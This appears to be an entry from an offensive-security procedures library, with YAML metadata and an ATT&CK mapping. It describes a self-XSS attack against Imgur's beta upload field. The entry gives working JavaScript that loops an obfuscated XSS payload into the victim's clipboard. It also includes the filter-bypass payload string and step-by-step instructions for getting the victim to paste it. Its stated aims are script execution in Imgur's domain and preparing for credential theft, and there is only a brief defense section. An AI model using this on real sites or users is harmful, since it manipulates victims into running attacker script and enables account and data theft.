---
id: proc-imgur-self-xss-injection
tags:
  - self-xss
  - dom-based
  - clipboard-api
  - payload-injection
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/clipboard-write-interval-generic]]'
  - '[[commands/clipboard-write-self-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:06.863Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-and-Execute-Self-XSS-Payload

## Summary

This procedure uses the clipboard API to repeatedly write a crafted self-XSS payload, tricking the victim into pasting it into Imgur's beta upload field, where insufficient sanitization allows DOM-based execution of JavaScript upon enter or click.

## Description

The payload bypasses upload sanitization rules in Firefox by exploiting parsing quirks (e.g., '<<!<script>...' injects iframe with JS). Chained from user guidance, it executes in the upload page context. Prerequisites: Victim pasted and permissions granted. Expected outcome: Arbitrary JS runs, enabling data theft.

## Requirements

1. Victim on upload page with paste completed
2. Firefox clipboard permission granted
3. Payload: '<<!<script>iframe src=javajavascriptscript:alert(document.domain)>'
4. Upload field focused

## Defense

Defensive measures and detection strategies:

- Strict input sanitization for upload fields (e.g., strip script tags, validate URLs)
- CSP to block inline JS execution
- Monitor clipboard API usage in browser logs
- Rate-limit or validate paste events client-side

## Objectives

1. Inject unsanitized payload via user paste
2. Execute JS in Imgur domain context
3. Prepare for credential access

## Instructions

### Step 1: Generic Clipboard Write Setup

**Context**: Prepare interval for writing payloads.

**Command** ([[commands/clipboard-write-interval-generic]]):
```javascript
setInterval(function(){navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)});},1000)
```

> Replaces PAYLOAD with actual string. Expected output: Console logs written text every second.

### Step 2: Write Specific Self-XSS

**Context**: Use exact payload for Imgur bypass.

**Command** ([[commands/clipboard-write-self-xss]]):
```javascript
setInterval(function(){navigator.clipboard.writeText("<<!<script>iframe src=javajavascriptscript:alert(document.domain)>").then(function(text){console.log(text)})},1000)
```

> Writes bypass payload. Expected output: Payload in clipboard; log confirms.

### Step 3: Trigger Execution

**Context**: Victim pastes and presses enter/clicks.

**Command** (Integrated in paste):
```javascript
// Payload executes: self.innerHTML=parent.name or alert(domain)
```

> No separate command; triggered by paste. Expected output: JS alert or injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/clipboard-write-interval-generic]]
- [[commands/clipboard-write-self-xss]]

## Tools Used

- [[tools/Firefox]]

## Tags

- self-xss
- dom-based
- clipboard-api
- payload-injection
